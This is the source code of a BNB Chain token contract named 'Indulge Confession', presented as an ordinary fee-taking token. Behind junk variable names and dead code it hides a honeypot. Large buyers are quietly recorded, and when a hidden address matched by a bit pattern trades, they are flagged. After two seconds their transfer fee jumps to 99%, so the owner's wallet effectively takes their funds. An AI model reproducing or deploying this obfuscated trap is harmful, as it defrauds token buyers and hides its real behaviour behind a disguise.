/**
 *Submitted for verification at BscScan.com on 2022-12-10
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract IndulgeConfession is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Indulge Confession ";
    string constant _symbol = "IndulgeConfession";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private launchedFeeMinIs;
    mapping(address => bool) private feeReceiverBurnAuto;
    mapping(address => bool) private exemptReceiverWalletFee;
    mapping(address => bool) private botsSellBuyLimit;
    mapping(address => uint256) private teamBuyAutoLaunchedSwap;
    mapping(uint256 => address) private teamMaxModeAuto;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private walletTeamSwapSell = 0;
    uint256 private marketingExemptModeLimitBots = 7;

    //SELL FEES
    uint256 private feeMinSellBots = 0;
    uint256 private txExemptMaxSwap = 7;

    uint256 private maxBurnReceiverModeBuyIs = marketingExemptModeLimitBots + walletTeamSwapSell;
    uint256 private marketingReceiverFeeMode = 100;

    address private autoBuyWalletReceiver = (msg.sender); // auto-liq address
    address private launchedLiquidityMaxTradingWalletBurn = (0xD94E0936C4Ee7CFe4B90986EFFfFD3b9E0a94F64); // marketing address
    address private minLimitLaunchedBurnExemptMode = DEAD;
    address private teamLiquidityTxBuyTradingLaunched = DEAD;
    address private isModeMarketingSell = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private swapAutoIsTeam;
    uint256 private isExemptWalletBots;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private exemptReceiverBotsMaxMarketingBurn;
    uint256 private marketingTradingTxLimit;
    uint256 private txBotsReceiverMax;
    uint256 private minIsTeamAuto;
    uint256 private limitTradingLiquidityExempt;

    bool private txLaunchedMinSwapWalletMarketing = true;
    bool private botsSellBuyLimitMode = true;
    bool private minLaunchedLimitBuyExemptBotsReceiver = true;
    bool private swapBotsReceiverAutoMarketing = true;
    bool private sellFeeBotsSwap = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private maxMarketingTradingModeSellLiquidity = 6 * 10 ** 15;
    uint256 private botsSellWalletTradingFeeTxMin = _totalSupply / 1000; // 0.1%

    
    uint256 private tradingBuyMinIsMaxBotsAuto = 0;
    bool private burnSellBotsMin = false;
    uint256 private minSellMaxExemptMode = 0;
    bool private burnLaunchedModeBots = false;
    bool private burnBuyExemptTeamLaunchedMarketing = false;
    bool private burnMarketingIsTeamBuyMin = false;
    bool private buyAutoBotsBurnLimit = false;
    uint256 private feeWalletTeamTx = 0;
    bool private receiverMarketingTxBurnLaunchedModeLimit = false;
    uint256 private receiverSellMarketingWallet = 0;
    uint256 private burnSellBotsMin0 = 0;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        exemptReceiverBotsMaxMarketingBurn = true;

        launchedFeeMinIs[msg.sender] = true;
        launchedFeeMinIs[address(this)] = true;

        feeReceiverBurnAuto[msg.sender] = true;
        feeReceiverBurnAuto[0x0000000000000000000000000000000000000000] = true;
        feeReceiverBurnAuto[0x000000000000000000000000000000000000dEaD] = true;
        feeReceiverBurnAuto[address(this)] = true;

        exemptReceiverWalletFee[msg.sender] = true;
        exemptReceiverWalletFee[0x0000000000000000000000000000000000000000] = true;
        exemptReceiverWalletFee[0x000000000000000000000000000000000000dEaD] = true;
        exemptReceiverWalletFee[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return liquidityTradingReceiverIs(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return liquidityTradingReceiverIs(sender, recipient, amount);
    }

    function liquidityTradingReceiverIs(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        if (burnLaunchedModeBots == buyAutoBotsBurnLimit) {
            burnLaunchedModeBots = burnBuyExemptTeamLaunchedMarketing;
        }

        if (buyAutoBotsBurnLimit != burnLaunchedModeBots) {
            buyAutoBotsBurnLimit = burnSellBotsMin;
        }

        if (minSellMaxExemptMode != minSellMaxExemptMode) {
            minSellMaxExemptMode = txExemptMaxSwap;
        }


        bool bLimitTxWalletValue = swapFeeAutoTradingModeIsReceiver(sender) || swapFeeAutoTradingModeIsReceiver(recipient);
        
        if (burnSellBotsMin0 != walletTeamSwapSell) {
            burnSellBotsMin0 = feeMinSellBots;
        }

        if (burnSellBotsMin != minLaunchedLimitBuyExemptBotsReceiver) {
            burnSellBotsMin = txLaunchedMinSwapWalletMarketing;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                marketingTradingLaunchedFeeSwapIs();
            }
            if (!bLimitTxWalletValue) {
                isBotsSellMax(recipient);
            }
        }
        
        if (buyAutoBotsBurnLimit != burnSellBotsMin) {
            buyAutoBotsBurnLimit = burnSellBotsMin;
        }


        if (inSwap || bLimitTxWalletValue) {return liquidityWalletBotsMarketing(sender, recipient, amount);}

        if (!launchedFeeMinIs[sender] && !launchedFeeMinIs[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }
        
        if (receiverSellMarketingWallet == marketingReceiverFeeMode) {
            receiverSellMarketingWallet = minSellMaxExemptMode;
        }

        if (receiverMarketingTxBurnLaunchedModeLimit == txLaunchedMinSwapWalletMarketing) {
            receiverMarketingTxBurnLaunchedModeLimit = swapBotsReceiverAutoMarketing;
        }


        require((amount <= _maxTxAmount) || exemptReceiverWalletFee[sender] || exemptReceiverWalletFee[recipient], "Max TX Limit has been triggered");

        if (limitTeamBotsAutoFeeLiquidity()) {receiverIsLiquidityTrading();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        if (minSellMaxExemptMode == feeMinSellBots) {
            minSellMaxExemptMode = marketingReceiverFeeMode;
        }

        if (burnSellBotsMin0 != marketingReceiverFeeMode) {
            burnSellBotsMin0 = minSellMaxExemptMode;
        }


        uint256 amountReceived = autoTradingWalletBurn(sender) ? txMinLaunchedMarketing(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function liquidityWalletBotsMarketing(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function autoTradingWalletBurn(address sender) internal view returns (bool) {
        return !feeReceiverBurnAuto[sender];
    }

    function receiverWalletExemptSwapBots(address sender, bool selling) internal returns (uint256) {
        
        if (burnMarketingIsTeamBuyMin == sellFeeBotsSwap) {
            burnMarketingIsTeamBuyMin = txLaunchedMinSwapWalletMarketing;
        }

        if (burnBuyExemptTeamLaunchedMarketing != buyAutoBotsBurnLimit) {
            burnBuyExemptTeamLaunchedMarketing = sellFeeBotsSwap;
        }

        if (tradingBuyMinIsMaxBotsAuto == maxBurnReceiverModeBuyIs) {
            tradingBuyMinIsMaxBotsAuto = tradingBuyMinIsMaxBotsAuto;
        }


        if (selling) {
            maxBurnReceiverModeBuyIs = txExemptMaxSwap + feeMinSellBots;
            return marketingTradingTxTeamSwapAutoFee(sender, maxBurnReceiverModeBuyIs);
        }
        if (!selling && sender == uniswapV2Pair) {
            maxBurnReceiverModeBuyIs = marketingExemptModeLimitBots + walletTeamSwapSell;
            return maxBurnReceiverModeBuyIs;
        }
        return marketingTradingTxTeamSwapAutoFee(sender, maxBurnReceiverModeBuyIs);
    }

    function burnLiquiditySellWallet() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function txMinLaunchedMarketing(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (burnSellBotsMin0 == txExemptMaxSwap) {
            burnSellBotsMin0 = maxMarketingTradingModeSellLiquidity;
        }

        if (burnSellBotsMin == receiverMarketingTxBurnLaunchedModeLimit) {
            burnSellBotsMin = txLaunchedMinSwapWalletMarketing;
        }


        uint256 feeAmount = amount.mul(receiverWalletExemptSwapBots(sender, receiver == uniswapV2Pair)).div(marketingReceiverFeeMode);

        if (botsSellBuyLimit[sender] || botsSellBuyLimit[receiver]) {
            feeAmount = amount.mul(99).div(marketingReceiverFeeMode);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function swapFeeAutoTradingModeIsReceiver(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function marketingTradingTxTeamSwapAutoFee(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = teamBuyAutoLaunchedSwap[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function isBotsSellMax(address addr) private {
        if (burnLiquiditySellWallet() < maxMarketingTradingModeSellLiquidity) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        teamMaxModeAuto[exemptLimitValue] = addr;
    }

    function marketingTradingLaunchedFeeSwapIs() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (teamBuyAutoLaunchedSwap[teamMaxModeAuto[i]] == 0) {
                    teamBuyAutoLaunchedSwap[teamMaxModeAuto[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(launchedLiquidityMaxTradingWalletBurn).transfer(amountBNB * amountPercentage / 100);
    }

    function limitTeamBotsAutoFeeLiquidity() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    sellFeeBotsSwap &&
    _balances[address(this)] >= botsSellWalletTradingFeeTxMin;
    }

    function receiverIsLiquidityTrading() internal swapping {
        
        if (burnLaunchedModeBots == txLaunchedMinSwapWalletMarketing) {
            burnLaunchedModeBots = receiverMarketingTxBurnLaunchedModeLimit;
        }


        uint256 amountToLiquify = botsSellWalletTradingFeeTxMin.mul(walletTeamSwapSell).div(maxBurnReceiverModeBuyIs).div(2);
        uint256 amountToSwap = botsSellWalletTradingFeeTxMin.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = maxBurnReceiverModeBuyIs.sub(walletTeamSwapSell.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(walletTeamSwapSell).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(marketingExemptModeLimitBots).div(totalETHFee);
        
        if (burnMarketingIsTeamBuyMin != swapBotsReceiverAutoMarketing) {
            burnMarketingIsTeamBuyMin = burnMarketingIsTeamBuyMin;
        }


        payable(launchedLiquidityMaxTradingWalletBurn).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoBuyWalletReceiver,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getMinLimitLaunchedBurnExemptMode() public view returns (address) {
        if (minLimitLaunchedBurnExemptMode != teamLiquidityTxBuyTradingLaunched) {
            return teamLiquidityTxBuyTradingLaunched;
        }
        if (minLimitLaunchedBurnExemptMode != minLimitLaunchedBurnExemptMode) {
            return minLimitLaunchedBurnExemptMode;
        }
        return minLimitLaunchedBurnExemptMode;
    }
    function setMinLimitLaunchedBurnExemptMode(address a0) public onlyOwner {
        if (minLimitLaunchedBurnExemptMode != isModeMarketingSell) {
            isModeMarketingSell=a0;
        }
        if (minLimitLaunchedBurnExemptMode != launchedLiquidityMaxTradingWalletBurn) {
            launchedLiquidityMaxTradingWalletBurn=a0;
        }
        minLimitLaunchedBurnExemptMode=a0;
    }

    function getSwapBotsReceiverAutoMarketing() public view returns (bool) {
        if (swapBotsReceiverAutoMarketing != receiverMarketingTxBurnLaunchedModeLimit) {
            return receiverMarketingTxBurnLaunchedModeLimit;
        }
        if (swapBotsReceiverAutoMarketing != burnBuyExemptTeamLaunchedMarketing) {
            return burnBuyExemptTeamLaunchedMarketing;
        }
        if (swapBotsReceiverAutoMarketing == botsSellBuyLimitMode) {
            return botsSellBuyLimitMode;
        }
        return swapBotsReceiverAutoMarketing;
    }
    function setSwapBotsReceiverAutoMarketing(bool a0) public onlyOwner {
        swapBotsReceiverAutoMarketing=a0;
    }

    function getFeeReceiverBurnAuto(address a0) public view returns (bool) {
        if (a0 != isModeMarketingSell) {
            return burnSellBotsMin;
        }
        if (a0 == isModeMarketingSell) {
            return minLaunchedLimitBuyExemptBotsReceiver;
        }
            return feeReceiverBurnAuto[a0];
    }
    function setFeeReceiverBurnAuto(address a0,bool a1) public onlyOwner {
        if (feeReceiverBurnAuto[a0] != exemptReceiverWalletFee[a0]) {
           exemptReceiverWalletFee[a0]=a1;
        }
        feeReceiverBurnAuto[a0]=a1;
    }

    function getMaxBurnReceiverModeBuyIs() public view returns (uint256) {
        if (maxBurnReceiverModeBuyIs == marketingExemptModeLimitBots) {
            return marketingExemptModeLimitBots;
        }
        if (maxBurnReceiverModeBuyIs == marketingReceiverFeeMode) {
            return marketingReceiverFeeMode;
        }
        if (maxBurnReceiverModeBuyIs == tradingBuyMinIsMaxBotsAuto) {
            return tradingBuyMinIsMaxBotsAuto;
        }
        return maxBurnReceiverModeBuyIs;
    }
    function setMaxBurnReceiverModeBuyIs(uint256 a0) public onlyOwner {
        maxBurnReceiverModeBuyIs=a0;
    }

    function getBurnSellBotsMin() public view returns (bool) {
        return burnSellBotsMin;
    }
    function setBurnSellBotsMin(bool a0) public onlyOwner {
        if (burnSellBotsMin != buyAutoBotsBurnLimit) {
            buyAutoBotsBurnLimit=a0;
        }
        if (burnSellBotsMin == receiverMarketingTxBurnLaunchedModeLimit) {
            receiverMarketingTxBurnLaunchedModeLimit=a0;
        }
        burnSellBotsMin=a0;
    }

    function getLaunchedLiquidityMaxTradingWalletBurn() public view returns (address) {
        return launchedLiquidityMaxTradingWalletBurn;
    }
    function setLaunchedLiquidityMaxTradingWalletBurn(address a0) public onlyOwner {
        if (launchedLiquidityMaxTradingWalletBurn == isModeMarketingSell) {
            isModeMarketingSell=a0;
        }
        if (launchedLiquidityMaxTradingWalletBurn != autoBuyWalletReceiver) {
            autoBuyWalletReceiver=a0;
        }
        launchedLiquidityMaxTradingWalletBurn=a0;
    }

    function getBurnBuyExemptTeamLaunchedMarketing() public view returns (bool) {
        if (burnBuyExemptTeamLaunchedMarketing == burnSellBotsMin) {
            return burnSellBotsMin;
        }
        if (burnBuyExemptTeamLaunchedMarketing == burnMarketingIsTeamBuyMin) {
            return burnMarketingIsTeamBuyMin;
        }
        if (burnBuyExemptTeamLaunchedMarketing != botsSellBuyLimitMode) {
            return botsSellBuyLimitMode;
        }
        return burnBuyExemptTeamLaunchedMarketing;
    }
    function setBurnBuyExemptTeamLaunchedMarketing(bool a0) public onlyOwner {
        if (burnBuyExemptTeamLaunchedMarketing == burnLaunchedModeBots) {
            burnLaunchedModeBots=a0;
        }
        if (burnBuyExemptTeamLaunchedMarketing != receiverMarketingTxBurnLaunchedModeLimit) {
            receiverMarketingTxBurnLaunchedModeLimit=a0;
        }
        if (burnBuyExemptTeamLaunchedMarketing != burnSellBotsMin) {
            burnSellBotsMin=a0;
        }
        burnBuyExemptTeamLaunchedMarketing=a0;
    }

    function getBotsSellWalletTradingFeeTxMin() public view returns (uint256) {
        return botsSellWalletTradingFeeTxMin;
    }
    function setBotsSellWalletTradingFeeTxMin(uint256 a0) public onlyOwner {
        if (botsSellWalletTradingFeeTxMin == maxBurnReceiverModeBuyIs) {
            maxBurnReceiverModeBuyIs=a0;
        }
        botsSellWalletTradingFeeTxMin=a0;
    }

    function getExemptReceiverWalletFee(address a0) public view returns (bool) {
            return exemptReceiverWalletFee[a0];
    }
    function setExemptReceiverWalletFee(address a0,bool a1) public onlyOwner {
        exemptReceiverWalletFee[a0]=a1;
    }

    function getTeamLiquidityTxBuyTradingLaunched() public view returns (address) {
        if (teamLiquidityTxBuyTradingLaunched == launchedLiquidityMaxTradingWalletBurn) {
            return launchedLiquidityMaxTradingWalletBurn;
        }
        return teamLiquidityTxBuyTradingLaunched;
    }
    function setTeamLiquidityTxBuyTradingLaunched(address a0) public onlyOwner {
        teamLiquidityTxBuyTradingLaunched=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}